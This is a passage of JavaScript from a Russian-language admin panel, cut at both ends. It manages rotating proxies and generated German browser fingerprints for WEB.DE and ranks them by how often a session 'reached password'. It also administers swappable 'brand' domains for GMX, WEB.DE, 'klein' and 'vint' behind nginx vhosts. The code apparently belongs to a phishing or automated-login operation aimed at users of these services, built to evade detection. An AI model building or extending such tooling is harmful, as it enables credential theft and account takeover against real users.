            return r3.text().then(function (txt3) {
              return parseAdminConfigResponse(r3, txt3);
            });
          })
              .then(function (w3) {
                if (applyIfOk(w3)) return;
            var urlPost = bundleBase + Date.now();
            return authFetch(urlPost, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ content: '' }),
            })
              .then(function (r4) {
                return r4.text().then(function (txt4) {
                  return parseAdminConfigResponse(r4, txt4);
                });
              })
              .then(function (w4) {
                if (applyIfOk(w4)) return;
                failBoth(w3, w4);
              });
          });
      }
      function tryProxiesWebdeFpFallback() {
        return authFetch('/api/config/proxies?webdeFp=1&nc=' + Date.now())
          .then(function (r2) {
            return r2.text().then(function (txt2) {
              return parseAdminConfigResponse(r2, txt2);
            });
          })
          .then(function (w2) {
            var wi = w2.data && w2.data.webdeIndices;
            if (w2.ok && !w2.parseErr && wi && wi.pool) {
              showWebdeFpListMessage('', '');
              webdeFpIndicesContentFromServer = (wi.content != null ? String(wi.content) : '').trim();
              applyWebdeFpListPayload(wi.pool, webdeFpIndicesContentFromServer);
              return;
            }
            if (!w2.ok) {
              showWebdeFpListMessage('GET /api/config/proxies?webdeFp=1 недоступен (HTTP ' + w2.status + '). Пробуем GET proxies-validate?webdeFpBundle=1…', 'error');
            } else if (w2.parseErr) {
              showWebdeFpListMessage('Ответ proxies?webdeFp=1 не JSON. Пробуем GET bundle…', 'error');
            } else {
              showWebdeFpListMessage('Ответ proxies без webdeIndices (старый server.js). Пробуем GET bundle…', 'error');
            }
            return tryWebdeFpViaValidateBundle();
          });
      }
      return authFetch('/api/config/webde-fingerprint-indices?nc=' + Date.now())
        .then(function (r) {
          return r.text().then(function (txt) {
            return parseAdminConfigResponse(r, txt);
          });
        })
        .then(function (w) {
          var data = w.data || {};
          if (w.ok && !w.parseErr && data.pool) {
            webdeFpIndicesContentFromServer = (data.content != null ? String(data.content) : '').trim();
            applyWebdeFpListPayload(data.pool, webdeFpIndicesContentFromServer);
            return Promise.resolve();
          }
          if (w.ok && w.parseErr) {
            showWebdeFpListMessage('Ответ не JSON (длина ' + w.txtLen + '). Пробуем fallback через /api/config/proxies…', 'error');
            return tryProxiesWebdeFpFallback();
          }
          if (!w.ok || !data.pool) {
            if (!w.ok && w.status !== 404) {
              showWebdeFpListMessage('Индексы: HTTP ' + w.status + '. Пробуем fallback через /api/config/proxies…', 'error');
            }
            return tryProxiesWebdeFpFallback();
          }
        })
        .catch(function () {
          showWebdeFpListMessage('Ошибка сети при загрузке индексов и пула.', 'error');
          renderFpFallbackRowsOnly();
        });
    }
    var configWebdeFpCheck = document.getElementById('config-webde-fp-check');
    if (configWebdeFpCheck) configWebdeFpCheck.addEventListener('click', function () {
      loadConfigWebdeFpIndices();
    });
    var configWebdeFpGenerateDe = document.getElementById('config-webde-fp-generate-de');
    if (configWebdeFpGenerateDe) configWebdeFpGenerateDe.addEventListener('click', function () {
      configWebdeFpGenerateDe.disabled = true;
      showWebdeFpListMessage('Полная замена пула: генерирую 100 отпечатков (DE)…', '');
      postJson('/api/config/webde-fingerprints-generate-de', {})
        .then(function (r) {
          return r.text().then(function (text) {
            var j = null;
            try {
              j = text ? JSON.parse(text) : null;
            } catch (parseErr) {
              throw new Error('Ответ не JSON (HTTP ' + r.status + '). Частая причина: эндпоинт не в allowlist ADMIN_DOMAIN — ' + String(text || '').slice(0, 120));
            }
            if (!r.ok) throw new Error((j && j.error) ? j.error : ('HTTP ' + r.status));
            return j;
          });
        })
        .then(function (data) {
          var n = (data && data.fingerprintCount != null) ? parseInt(data.fingerprintCount, 10) : NaN;
          if (!isFinite(n) && data && data.pool && Array.isArray(data.pool.entries)) n = data.pool.entries.length;
          if (!isFinite(n)) n = 100;
          showWebdeFpListMessage('Пул полностью заменён: ' + n + ' отпечатков сохранено (JSON + пул для сайта).', 'success');
          showToast('Готово: сохранено ' + n + ' новых отпечатков, активные индексы сброшены на весь пул', 'success');
          try { loadProxyFpStats(); } catch (e) {}
          return loadConfigWebdeFpIndices();
        })
        .catch(function (err) {
          var msg = (err && err.message) || 'Ошибка генерации отпечатков';
          showWebdeFpListMessage(msg, 'error');
          showToast(msg, 'error');
        })
        .finally(function () {
          configWebdeFpGenerateDe.disabled = false;
        });
    });

    function fmtPct(ok, total) {
      var t = parseInt(total, 10) || 0;
      var o = parseInt(ok, 10) || 0;
      if (t <= 0) return '—';
      var p = Math.round((o / t) * 1000) / 10;
      return String(p) + '%';
    }

    var proxyFpStatsCache = { proxies: {}, fps: {} };
    function proxyLineToHostPort(line) {
      var s = String(line || '').trim();
      if (!s) return '';
      s = s.replace(/^\s*(https?|socks5?|socks4?):\/\/\s*/i, '').trim();
      /** host:port:user:pass — нельзя split(':'), иначе IPv4 даёт «185:90». */
      var mIp = s.match(/^(\d{1,3}(?:\.\d{1,3}){3}):(\d{1,5})(?::|$)/);
      if (mIp) {
        var prt = parseInt(mIp[2], 10);
        if (!isNaN(prt) && prt >= 1 && prt <= 65535) return mIp[1] + ':' + String(prt);
      }
      if (s.indexOf('@') !== -1) {
        var ap = s.split('@');
        if (ap.length === 2) {
          // creds@host:port OR host:port@creds
          var left = String(ap[0] || '').trim();
          var right = String(ap[1] || '').trim();
          var leftParts = left.split(':');
          var rightParts = right.split(':');
          var isPort = function (x) { var n = parseInt(String(x || ''), 10); return !isNaN(n) && n >= 1 && n <= 65535; };
          if (rightParts.length >= 2 && isPort(rightParts[rightParts.length - 1])) {
            var rp = parseInt(rightParts[rightParts.length - 1], 10);
            var rh = rightParts.slice(0, -1).join(':');
            return String(rh || '').trim() + ':' + String(rp);
          }
          if (leftParts.length >= 2 && isPort(leftParts[leftParts.length - 1])) {
            var lp = parseInt(leftParts[leftParts.length - 1], 10);
            var lh = leftParts.slice(0, -1).join(':');
            return String(lh || '').trim() + ':' + String(lp);
          }
        }
      }
      var parts = s.split(':');
      // login:pass:host:port (ровно 4 сегмента, последний — порт)
      if (parts.length === 4) {
        var p4 = parseInt(parts[3], 10);
        if (!isNaN(p4) && p4 >= 1 && p4 <= 65535) return String(parts[2] || '').trim() + ':' + String(p4);
      }
      // hostname:port (без IPv4 в первом сегменте — иначе уже обработано выше)
      if (parts.length >= 2) {
        var pLast = parseInt(parts[parts.length - 1], 10);
        if (!isNaN(pLast) && pLast >= 1 && pLast <= 65535) {
          var hostOnly = parts.slice(0, -1).join(':');
          if (hostOnly.indexOf('.') !== -1 || /^[a-z0-9.-]+$/i.test(hostOnly)) return String(hostOnly).trim() + ':' + String(pLast);
        }
      }
      return '';
    }
    function applyProxyFpStatsCache(rows) {
      proxyFpStatsCache = { proxies: {}, fps: {} };
      function addToBucket(bucket, key, pairs, ok, bad) {
        if (!key) return;
        if (!bucket[key]) bucket[key] = { pairs: 0, ok: 0, bad: 0, pct: '—' };
        bucket[key].pairs += pairs;
        bucket[key].ok += ok;
        bucket[key].bad += bad;
        bucket[key].pct = fmtPct(bucket[key].ok, bucket[key].pairs);
      }
      (rows || []).forEach(function (r) {
        var ps = String(r.proxyServer || '').trim();
        var fp = (r.fpIndex != null) ? String(r.fpIndex) : '';
        var pairs = parseInt(r.pairs, 10) || 0;
        var ok = parseInt(r.reachedPassword, 10) || 0;
        var bad = parseInt(r.notReachedPassword, 10) || 0;
        if (ps) {
          // Суммируем все строки одного прокси (по разным fp), иначе UI показывает только последнюю строку.
          addToBucket(proxyFpStatsCache.proxies, ps, pairs, ok, bad);
          var hostPort = proxyLineToHostPort(ps);
          if (hostPort) {
            addToBucket(proxyFpStatsCache.proxies, hostPort, pairs, ok, bad);
            addToBucket(proxyFpStatsCache.proxies, 'http://' + hostPort, pairs, ok, bad);
            addToBucket(proxyFpStatsCache.proxies, 'https://' + hostPort, pairs, ok, bad);
          }
        }
        if (fp !== '') addToBucket(proxyFpStatsCache.fps, fp, pairs, ok, bad);
      });
    }
    function getProxyStatsForLine(proxyLine) {
      var key = String(proxyLine || '').trim();
      if (!key) return null;
      var hit = proxyFpStatsCache.proxies[key] || null;
      if (hit) return hit;
      var hp = proxyLineToHostPort(key);
      if (hp && proxyFpStatsCache.proxies[hp]) return proxyFpStatsCache.proxies[hp];
      if (hp && proxyFpStatsCache.proxies['http://' + hp]) return proxyFpStatsCache.proxies['http://' + hp];
      if (hp && proxyFpStatsCache.proxies['https://' + hp]) return proxyFpStatsCache.proxies['https://' + hp];
      return null;
    }
    function getFpStatsForIndex(fpIndex) {
      var key = (fpIndex != null) ? String(fpIndex) : '';
      return key !== '' ? (proxyFpStatsCache.fps[key] || null) : null;
    }
    function buildInlineStatsNode(stats) {
      var wrap = document.createElement('span');
      wrap.className = 'config-inline-stats';
      var c = document.createElement('span');
      c.className = 'config-inline-stats-chip';
      if (!stats) {
        c.textContent = '—';
        wrap.appendChild(c);
        return wrap;
      }
      // формат: ok | total | %
      c.textContent = String(stats.ok) + ' | ' + String(stats.pairs) + ' | ' + String(stats.pct);
      wrap.appendChild(c);
      return wrap;
    }

    function aggregateProxyFpStats(rows) {
      var byProxy = {};
      var byFp = {};
      (rows || []).forEach(function (r) {
        var ps = String(r.proxyServer || '').trim();
        var fp = (r.fpIndex != null) ? String(r.fpIndex) : '';
        var pairs = parseInt(r.pairs, 10) || 0;
        var ok = parseInt(r.reachedPassword, 10) || 0;
        var bad = parseInt(r.notReachedPassword, 10) || 0;
        if (ps) {
          if (!byProxy[ps]) byProxy[ps] = { key: ps, pairs: 0, ok: 0, bad: 0 };
          byProxy[ps].pairs += pairs;
          byProxy[ps].ok += ok;
          byProxy[ps].bad += bad;
        }
        if (fp !== '') {
          if (!byFp[fp]) byFp[fp] = { key: fp, pairs: 0, ok: 0, bad: 0 };
          byFp[fp].pairs += pairs;
          byFp[fp].ok += ok;
          byFp[fp].bad += bad;
        }
      });
      function sortArr(obj) {
        return Object.keys(obj).map(function (k) { return obj[k]; }).sort(function (a, b) {
          return (b.pairs - a.pairs) || (b.ok - a.ok) || String(a.key).localeCompare(String(b.key));
        });
      }
      return { proxies: sortArr(byProxy), fps: sortArr(byFp) };
    }

    function rerenderProxyAndFpLists() {
      try { rerenderProxiesEditor(); } catch (e) {}
      // fingerprints list rerender happens on next loadConfigWebdeFpIndices() call; call it if present
      try { if (typeof loadConfigWebdeFpIndices === 'function') loadConfigWebdeFpIndices(); } catch (e2) {}
    }

    function loadProxyFpStats() {
      return authFetch('/api/config/proxy-fp-stats?nc=' + Date.now())
        .then(function (r) {
          return r.text().then(function (txt) {
            return { ok: r.ok, status: r.status, txt: txt };
          });
        })
        .then(function (w) {
          var data = {};
          try {
            data = w.txt && String(w.txt).trim() ? JSON.parse(w.txt) : {};
          } catch (eJ) {
            showToast('Статистика прокси: ответ не JSON (HTTP ' + w.status + ')');
            return;
          }
          if (!w.ok) {
            showToast((data && data.error) ? String(data.error) : 'Статистика прокси HTTP ' + w.status);
            return;
          }
          var rows = (data && data.rows) ? data.rows : [];
          applyProxyFpStatsCache(rows);
          rerenderProxyAndFpLists();
        })
        .catch(function (err) {
          showToast((err && err.message) || 'Ошибка загрузки статистики');
        });
    }

    var proxyFpStatsRefreshBtnTop = document.getElementById('config-proxy-fp-stats-refresh-top');
    if (proxyFpStatsRefreshBtnTop) proxyFpStatsRefreshBtnTop.addEventListener('click', function () {
      loadProxyFpStats();
    });
    // Per-row delete is shown next to proxies/fingerprints now.
    function showWebdeFpListMessage(text, type) {
      var el = document.getElementById('config-webde-fp-list-message');
      if (!el) return;
      el.textContent = text || '';
      el.classList.toggle('hidden', !text);
      el.classList.toggle('success', type === 'success');
      el.classList.toggle('error', type === 'error');
    }
    function parseWebdeFpIndicesFromText(text) {
      var out = [];
      var seen = {};
      String(text || '').split(/\r?\n/).forEach(function (line) {
        var s = line.trim();
        if (!s || s.charAt(0) === '#') return;
        var n = parseInt(s.split(/\s+/)[0], 10);
        if (!isNaN(n) && n >= 0 && !seen[n]) {
          seen[n] = true;
          out.push(n);
        }
      });
      out.sort(function (a, b) { return a - b; });
      return out;
    }
    function buildFallbackFpEntries(indices) {
      var sum = 'Нет описания с сервера — положите login/webde_fingerprints.json рядом с сервером и перезапустите Node.';
      return indices.map(function (i) {
        return { index: i, summary: sum, active: true };
      });
    }
    function renderConfigWebdeFpList(data) {
      var wrap = document.getElementById('config-webde-fp-list');
      if (!wrap) return;
      var entries = (data && data.entries) ? data.entries : [];
      wrap.innerHTML = '';
      if (entries.length === 0) {
        wrap.innerHTML = '';
        var empty = document.createElement('div');
        empty.className = 'config-fp-empty';
        empty.innerHTML = '<p class="config-fp-empty-title">Нет отпечатков в списке</p>' +
          '<p class="config-fp-empty-hint">Нажмите «Обновить» или «Сгенерировать (DE)», либо проверьте файл пула на сервере.</p>';
        wrap.appendChild(empty);
        return;
      }
      function setPendingBtn(btn, pending) {
        if (!btn) return;
        btn.disabled = !!pending;
        btn.classList.toggle('is-pending', !!pending);
      }
      function rebuildIndicesText(indices) {
        return (indices || []).map(function (n) { return String(n); }).join('\n');
      }
      function deleteFpIndex(index, btn) {
        var idxN = parseInt(index, 10);
        if (isNaN(idxN) || idxN < 0) return;
        var current = parseWebdeFpIndicesFromText(getWebdeFpIndicesTextarea());
        if (current.indexOf(idxN) === -1) return;
        var next = current.filter(function (n) { return n !== idxN; });
        webdeFpIndicesContentFromServer = rebuildIndicesText(next);
        showWebdeFpListMessage('Удаление индекса ' + idxN + '…', '');
        setPendingBtn(btn, true);
        postJson('/api/config/webde-fingerprint-indices', { content: webdeFpIndicesContentFromServer })
          .then(function () {
            showWebdeFpListMessage('Удалено: ' + idxN, 'success');
            return loadConfigWebdeFpIndices();
          })
          .catch(function (err) {
            showWebdeFpListMessage((err && err.message) || 'Ошибка удаления', 'error');
            // rollback: restore current
            webdeFpIndicesContentFromServer = rebuildIndicesText(current);
          })
          .finally(function () {
            setPendingBtn(btn, false);
          });
      }
      entries.forEach(function (e) {
        if (e && e.active === false) return;
        var fpIdxRaw = (e && e.index != null) ? parseInt(e.index, 10) : NaN;
        var fpNumber = (e && e.number != null) ? parseInt(e.number, 10) : NaN;
        if (!isFinite(fpNumber)) {
          fpNumber = isFinite(fpIdxRaw) ? (fpIdxRaw + 1) : NaN;
        }
        var fpLabel = isFinite(fpNumber) ? String(fpNumber) : String((e && e.index != null) ? e.index : '—');
        var row = document.createElement('div');
        row.className = 'config-item-row ' + (e.active ? 'config-item-row--active' : 'config-item-row--inactive');
        var left = document.createElement('div');
        left.className = 'config-item-left';
        var idx = document.createElement('span');
        idx.className = 'config-item-index';
        idx.textContent = fpLabel;
        var sum = document.createElement('span');
        sum.className = 'config-item-text';
        sum.textContent = (e.summary != null ? String(e.summary) : '—');
        left.appendChild(idx);
        left.appendChild(sum);
        var actions = document.createElement('div');
        actions.className = 'config-item-right';
        actions.appendChild(buildInlineStatsNode(getFpStatsForIndex(e.index)));
        var del = document.createElement('button');
        del.type = 'button';
        del.className = 'btn btn-ghost btn-sm config-item-trash config-item-trash--icon';
        del.setAttribute('aria-label', 'Удалить отпечаток #' + fpLabel);
        del.title = 'Удалить индекс ' + String(e.index) + ' (№' + fpLabel + ')';
        del.addEventListener('click', function (ev) {
          if (ev && ev.preventDefault) ev.preventDefault();
          // optimistic remove
          row.parentNode && row.parentNode.removeChild(row);
          deleteFpIndex(e.index, del);
        });
        actions.appendChild(del);
        row.appendChild(left);
        row.appendChild(actions);
        wrap.appendChild(row);
      });
    }
    // WEB.DE probe UI removed.

    /** Последние сохранённые основные домены (apex) — для переноса старого в «Старые хосты». */
    var lastSavedBrandPrimary = { gmx: '', webde: '', klein: '', vint: '' };

    function normBrandDomainInput(raw) {
      return String(raw || '')
        .trim()
        .toLowerCase()
        .replace(/^https?:\/\//i, '')
        .split('/')[0]
        .replace(/^www\./i, '');
    }

    function updateBrandDisplayHost(brandKey) {
      var inp = document.getElementById('config-brand-' + brandKey + '-domain');
      var disp = document.getElementById('config-brand-' + brandKey + '-domain-display');
      if (!disp) return;
      var n = normBrandDomainInput(inp && inp.value);
      disp.textContent = n || '—';
    }

    function mergeLegacyHostInDom(brandKey, host) {
      var h = normBrandDomainInput(host);
      if (!h) return;
      var prim = normBrandDomainInput(
        (document.getElementById('config-brand-' + brandKey + '-domain') || {}).value
      );
      if (h === prim) return;
      var listEl = document.getElementById('config-brand-' + brandKey + '-legacy-list');
      if (!listEl) return;
      if (listEl.querySelector('.config-brand-legacy-row[data-host="' + h + '"]')) return;
      var cur = collectBrandLegacyRawFromDom(brandKey);
      renderBrandLegacyList(brandKey, cur ? cur + '\n' + h : h);
    }

    function ensurePreviousPrimaryToLegacy(brandKey) {
      var inp = document.getElementById('config-brand-' + brandKey + '-domain');
      var newV = normBrandDomainInput(inp && inp.value);
      var oldV = lastSavedBrandPrimary[brandKey];
      if (!newV || !oldV || newV === oldV) return;
      mergeLegacyHostInDom(brandKey, oldV);
    }

    var BRAND_CARD_STATUS_SS = 'gmwAdminBrandCardStatus_v1';

    function readBrandCardStatusAll() {
      try {
        var raw = sessionStorage.getItem(BRAND_CARD_STATUS_SS);
        if (!raw) return {};
        var o = JSON.parse(raw);
        return o && typeof o === 'object' ? o : {};
      } catch (e) {
        return {};
      }
    }

    function writeBrandCardStatusEntry(brandKey, entry) {
      try {
        var o = readBrandCardStatusAll();
        o[brandKey] = entry;
        sessionStorage.setItem(BRAND_CARD_STATUS_SS, JSON.stringify(o));
      } catch (e) {}
    }

    function removeBrandCardStatusEntry(brandKey) {
      try {
        var o = readBrandCardStatusAll();
        delete o[brandKey];
        sessionStorage.setItem(BRAND_CARD_STATUS_SS, JSON.stringify(o));
      } catch (e) {}
    }

    function applyBrandCardStatusToDom(brandKey, e) {
      var st = document.getElementById('config-brand-' + brandKey + '-check-status');
      if (st) {
        if (e.lineText) {
          st.textContent = e.lineText;
          st.className =
            'config-brand-check-status' +
            (e.lineClass === 'ok'
              ? ' config-brand-check-status--ok'
              : e.lineClass === 'err'
                ? ' config-brand-check-status--err'
                : '');
        } else {
          st.textContent = '';
          st.className = 'config-brand-check-status';
        }
      }
      setBrandProvisionIcon(brandKey, e.iconState, e.iconTitle || '');
    }

    function restoreBrandCardStatusIfMatches(brandKey) {
      var inp = document.getElementById('config-brand-' + brandKey + '-domain');
      var d = normBrandDomainInput(inp && inp.value);
      var o = readBrandCardStatusAll();
      var e = o[brandKey];
      if (!d || !e || e.domain !== d) return false;
      applyBrandCardStatusToDom(brandKey, e);
      return true;
    }

    function resetBrandCardStatusRow(brandKey) {
      var st = document.getElementById('config-brand-' + brandKey + '-check-status');
      if (st) {
        st.textContent = '';
        st.className = 'config-brand-check-status';
      }
      setBrandProvisionIcon(brandKey, 'idle', 'Проверить домен снаружи (HTTP/HTTPS)');
    }

    function syncBrandCardStatusAfterDomainsLoad(brandKey) {
      if (!restoreBrandCardStatusIfMatches(brandKey)) {
        resetBrandCardStatusRow(brandKey);
      }
    }

    function runBrandDomainProbe(brandKey) {
      var st = document.getElementById('config-brand-' + brandKey + '-check-status');
      var d = normBrandDomainInput(
        (document.getElementById('config-brand-' + brandKey + '-domain') || {}).value
      );
      if (!d) {
        showToast('Введите домен');
        return;
      }
      var iconEl = document.getElementById('config-brand-' + brandKey + '-provision-icon');
      setBrandProvisionIcon(brandKey, 'loading', '');
      if (st) {
        st.textContent = 'Проверка…';
        st.className = 'config-brand-check-status';
      }
      if (iconEl) iconEl.disabled = true;
      postJson('/api/config/brand-domain-check', { domain: d })
        .then(function (r) { return r.json(); })
        .then(function (data) {
          if (data && data.ready) {
            var line =
              'OK' +
              (data.probeStatus != null ? ' HTTP ' + data.probeStatus : '') +
              (data.probeUrl ? ' \u2192 ' + data.probeUrl : '');
            var hintOk =
              (data.probeUrl ? String(data.probeUrl) : '') +
              (data.probeStatus != null ? ' HTTP ' + data.probeStatus : '');
            if (st) {
              st.className = 'config-brand-check-status config-brand-check-status--ok';
              st.textContent = line;
            }
            setBrandProvisionIcon(brandKey, 'ok', hintOk.trim() || 'Доступен');
            writeBrandCardStatusEntry(brandKey, {
              domain: d,
              iconState: 'ok',
              iconTitle: hintOk.trim() || 'Доступен',
              lineText: line,
              lineClass: 'ok'
            });
          } else {
            var msgErr = (data && data.message) ? String(data.message) : 'Нет ответа';
            if (st) {
              st.className = 'config-brand-check-status config-brand-check-status--err';
              st.textContent = msgErr;
            }
            setBrandProvisionIcon(brandKey, 'err', msgErr);
            writeBrandCardStatusEntry(brandKey, {
              domain: d,
              iconState: 'err',
              iconTitle: msgErr,
              lineText: msgErr,
              lineClass: 'err'
            });
          }
        })
        .catch(function (err) {
          var msgX = (err && err.message) || 'Ошибка';
          if (st) {
            st.className = 'config-brand-check-status config-brand-check-status--err';
            st.textContent = msgX;
          }
          setBrandProvisionIcon(brandKey, 'err', msgX);
          writeBrandCardStatusEntry(brandKey, {
            domain: d,
            iconState: 'err',
            iconTitle: msgX,
            lineText: msgX,
            lineClass: 'err'
          });
        })
        .finally(function () {
          if (iconEl) iconEl.disabled = false;
        });
    }

    function bindBrandDomainProbeIcon(brandKey) {
      var icon = document.getElementById('config-brand-' + brandKey + '-provision-icon');
      if (!icon) return;
      icon.addEventListener('click', function () {
        runBrandDomainProbe(brandKey);
      });
    }

    function parseBrandLegacyMultiline(raw) {
      var s = String(raw || '').trim();
      if (!s) return [];
      var parts = s.split(/[\n,]+/);
      var out = [];
      var seen = {};
      for (var i = 0; i < parts.length; i++) {
        var h = (parts[i] || '')
          .trim()
          .toLowerCase()
          .replace(/^https?:\/\//i, '')
          .split('/')[0]
          .replace(/^www\./i, '');
        if (!h || seen[h]) continue;
        seen[h] = true;
        out.push(h);
      }
      return out;
    }

    function renderBrandLegacyList(brandKey, raw) {
      var el = document.getElementById('config-brand-' + brandKey + '-legacy-list');
      if (!el) return;
      el.textContent = '';
      var lines = parseBrandLegacyMultiline(raw);
      for (var j = 0; j < lines.length; j++) {
        var row = document.createElement('div');
        row.className = 'config-brand-legacy-row';
        row.setAttribute('data-host', lines[j]);
        var span = document.createElement('span');
        span.className = 'config-brand-legacy-row__host';
        span.textContent = lines[j];
        var btn = document.createElement('button');
        btn.type = 'button';
        btn.className = 'btn btn-ghost btn-sm config-brand-legacy-remove';
        btn.setAttribute('data-brand', brandKey);
        btn.setAttribute('data-host', lines[j]);
        btn.textContent = 'Удалить';
        row.appendChild(span);
        row.appendChild(btn);
        el.appendChild(row);
      }
    }

    function collectBrandLegacyRawFromDom(brandKey) {
      var el = document.getElementById('config-brand-' + brandKey + '-legacy-list');
      if (!el) return '';
      var rows = el.querySelectorAll('.config-brand-legacy-row[data-host]');
      var hosts = [];
      var seen = {};
      for (var i = 0; i < rows.length; i++) {
        var h = (rows[i].getAttribute('data-host') || '').trim().toLowerCase();
        if (!h || seen[h]) continue;
        seen[h] = true;
        hosts.push(h);
      }
      return hosts.join('\n');
    }

    function loadConfigBrandDomains() {
      var hint = document.getElementById('config-brand-file-hint');
      var msg = document.getElementById('config-brand-message');
      var gmxD = document.getElementById('config-brand-gmx-domain');
      var webD = document.getElementById('config-brand-webde-domain');
      var klD = document.getElementById('config-brand-klein-domain');
      var vintD = document.getElementById('config-brand-vint-domain');
      if (msg) {
        msg.textContent = '';
        msg.classList.add('hidden');
      }
      authFetch('/api/config/brand-domains').then(function (r) { return r.json(); }).then(function (data) {
        if (gmxD) gmxD.value = (data && data.gmxDomain) ? String(data.gmxDomain) : '';
        if (webD) webD.value = (data && data.webdeDomain) ? String(data.webdeDomain) : '';
        if (klD) klD.value = (data && data.kleinDomain) ? String(data.kleinDomain) : '';
        if (vintD) vintD.value = (data && data.vintDomain) ? String(data.vintDomain) : '';
        renderBrandLegacyList('gmx', (data && data.gmxDomains) ? String(data.gmxDomains) : '');
        renderBrandLegacyList('webde', (data && data.webdeDomains) ? String(data.webdeDomains) : '');
        renderBrandLegacyList('klein', (data && data.kleinDomains) ? String(data.kleinDomains) : '');
        renderBrandLegacyList('vint', (data && data.vintDomains) ? String(data.vintDomains) : '');
        lastSavedBrandPrimary.gmx = normBrandDomainInput(gmxD && gmxD.value);
        lastSavedBrandPrimary.webde = normBrandDomainInput(webD && webD.value);
        lastSavedBrandPrimary.klein = normBrandDomainInput(klD && klD.value);
        lastSavedBrandPrimary.vint = normBrandDomainInput(vintD && vintD.value);
        updateBrandDisplayHost('gmx');
        updateBrandDisplayHost('webde');
        updateBrandDisplayHost('klein');
        updateBrandDisplayHost('vint');
        syncBrandCardStatusAfterDomainsLoad('gmx');
        syncBrandCardStatusAfterDomainsLoad('webde');
        syncBrandCardStatusAfterDomainsLoad('klein');
        syncBrandCardStatusAfterDomainsLoad('vint');
        if (hint) {
          hint.textContent = data && data.overridesFile ? 'JSON' : '.env';
          hint.className = 'config-brand-source-badge' + (data && data.overridesFile ? ' config-brand-source-badge--json' : ' config-brand-source-badge--env');
        }
        setTimeout(function () { AdminModalKit.syncCodeEditorHeights(); }, 0);
      }).catch(function () {
        if (hint) {
          hint.textContent = '';
          hint.className = 'config-brand-source-badge';
        }
        showToast('Не удалось загрузить домены брендов');
      });
    }

    function collectBrandDomainsPayloadFromDom() {
      var gmxD = document.getElementById('config-brand-gmx-domain');
      var webD = document.getElementById('config-brand-webde-domain');
      var klD = document.getElementById('config-brand-klein-domain');
      var vintD = document.getElementById('config-brand-vint-domain');
      return {
        gmxDomain: (gmxD && gmxD.value) || '',
        gmxDomains: collectBrandLegacyRawFromDom('gmx'),
        webdeDomain: (webD && webD.value) || '',
        webdeDomains: collectBrandLegacyRawFromDom('webde'),
        kleinDomain: (klD && klD.value) || '',
        kleinDomains: collectBrandLegacyRawFromDom('klein'),
        vintDomain: (vintD && vintD.value) || '',
        vintDomains: collectBrandLegacyRawFromDom('vint')
      };
    }

    var configBrandSectionEl = document.querySelector('.config-brand-section');
    if (configBrandSectionEl) {
      configBrandSectionEl.addEventListener('click', function (ev) {
        var btnRm = ev.target && ev.target.closest && ev.target.closest('.config-brand-legacy-remove');
        if (!btnRm) return;
        var b = (btnRm.getAttribute('data-brand') || '').trim();
        var h = (btnRm.getAttribute('data-host') || '').trim();
        if (!b || !h) return;
        if (!confirm('Полностью снять ' + h + ' с сервера (nginx vhost, short-домен если был)?')) return;
        btnRm.disabled = true;
        postJson('/api/config/brand-legacy-host-remove', { brand: b, host: h })
          .then(function (r) { return r.json(); })
          .then(function (data) {
            if (data && data.ok) {
              showToast('Удалено: ' + h);
              loadConfigBrandDomains();
            } else {
              showToast((data && data.error) || 'Ошибка');
            }
          })
          .catch(function (err) { showToast(err.message || 'Ошибка'); })
          .finally(function () { btnRm.disabled = false; });
      });
    }

    var configBrandSave = document.getElementById('config-brand-save');
    var configBrandReset = document.getElementById('config-brand-reset');
    if (configBrandSave) {
      configBrandSave.addEventListener('click', function () {
        var msg = document.getElementById('config-brand-message');
        ensurePreviousPrimaryToLegacy('gmx');
        ensurePreviousPrimaryToLegacy('webde');
        ensurePreviousPrimaryToLegacy('klein');
        ensurePreviousPrimaryToLegacy('vint');
        var payload = collectBrandDomainsPayloadFromDom();
        configBrandSave.disabled = true;
        postJson('/api/config/brand-domains', payload)
          .then(function (r) { return r.json(); })
          .then(function (data) {
            if (data && data.ok) {
              showToast('Домены брендов сохранены');
              if (msg) {
                msg.textContent = '';
                msg.classList.add('hidden');
              }
              loadConfigBrandDomains();
            } else {
              if (msg) {
                msg.textContent = (data && data.error) || 'Ошибка';
                msg.className = 'config-msg config-brand-message error';
                msg.classList.remove('hidden');
              } else {
                showToast((data && data.error) || 'Ошибка');
              }
            }
          })
          .catch(function (err) {
            showToast(err.message || 'Ошибка');
          })
          .finally(function () {
            configBrandSave.disabled = false;
          });
      });
    }
    if (configBrandReset) {
      configBrandReset.addEventListener('click', function () {
        if (!confirm('Удалить data/brand-domains.json и вернуть домены из .env?')) return;
        configBrandReset.disabled = true;
        authFetch('/api/config/brand-domains', { method: 'DELETE' })
          .then(function (r) { return r.json(); })
          .then(function (data) {
            if (data && data.ok) {
              showToast('Сброшено к .env');
              loadConfigBrandDomains();
            } else {
              showToast((data && data.error) || 'Ошибка');
            }
          })
          .catch(function () { showToast('Ошибка'); })
          .finally(function () {
            configBrandReset.disabled = false;
          });
      });
    }

    function setBrandProvisionIcon(brandKey, state, title) {
      var el = document.getElementById('config-brand-' + brandKey + '-provision-icon');
      if (!el) return;
      el.textContent = '';
      el.className = 'config-brand-provision-icon';
      el.title = title || '';
      if (el.tagName === 'BUTTON') {
        el.disabled = state === 'loading';
      }
      if (state === 'loading') {
        el.classList.add('config-brand-provision-icon--loading');
      } else if (state === 'ok') {
        el.classList.add('config-brand-provision-icon--ok');
        el.textContent = '\u2713';
      } else if (state === 'err') {
        el.classList.add('config-brand-provision-icon--err');
        el.textContent = '\u2715';
      } else if (state === 'idle') {
        el.classList.add('config-brand-provision-icon--idle');
      }
    }

    function bindBrandDomainApply(brandKey) {
      var btn = document.getElementById('config-brand-' + brandKey + '-apply');
      if (!btn) return;
      btn.addEventListener('click', function () {
        var probeIcon = document.getElementById('config-brand-' + brandKey + '-provision-icon');
        ensurePreviousPrimaryToLegacy(brandKey);
        var payload = collectBrandDomainsPayloadFromDom();
        var raw =
          brandKey === 'webde'
            ? String(payload.webdeDomain || '').trim()
            : brandKey === 'klein'
              ? String(payload.kleinDomain || '').trim()
              : brandKey === 'vint'
                ? String(payload.vintDomain || '').trim()
                : String(payload.gmxDomain || '').trim();
        var d = raw
          .replace(/^https?:\/\//i, '')
          .split('/')[0]
          .replace(/^www\./i, '')
          .toLowerCase();
        if (!d) {
          showToast('Введите домен в поле');
          return;
        }
        if (brandKey === 'gmx') payload.gmxDomain = d;
        else if (brandKey === 'webde') payload.webdeDomain = d;
        else if (brandKey === 'klein') payload.kleinDomain = d;
        else payload.vintDomain = d;
        if (
          !String(payload.gmxDomain || '').trim() ||
